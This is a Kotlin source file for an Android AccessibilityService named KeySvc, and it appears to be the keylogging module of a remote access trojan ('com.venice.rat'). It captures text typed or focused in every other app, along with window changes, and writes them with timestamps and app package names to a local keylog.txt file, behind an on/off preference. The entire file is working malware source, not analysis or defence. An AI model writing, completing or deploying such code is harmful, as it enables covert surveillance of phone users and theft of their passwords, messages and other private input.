package com.venice.rat.mod

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.venice.rat.core.Prefs
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class KeySvc : AccessibilityService() {
    companion object { @Volatile var inst: KeySvc? = null }
    private val fmt = SimpleDateFormat("dd/MM HH:mm:ss", Locale.US)

    override fun onServiceConnected() { super.onServiceConnected(); inst = this }

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        e ?: return
        if (!Prefs.keyOn(this)) return
        runCatching {
            val pkg = e.packageName?.toString() ?: return
            if (pkg == packageName) return
            val txt = when (e.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> e.text?.joinToString("").orEmpty()
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> e.text?.joinToString("").orEmpty()
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> e.className?.toString().orEmpty()
                else -> ""
            }
            if (txt.isBlank()) return
            File(filesDir, "keylog.txt")
                .appendText("${fmt.format(Date())} [$pkg] ${txt.take(150)}\n")
        }
    }

    override fun onInterrupt() {}
    override fun onDestroy() { inst = null; super.onDestroy() }
}
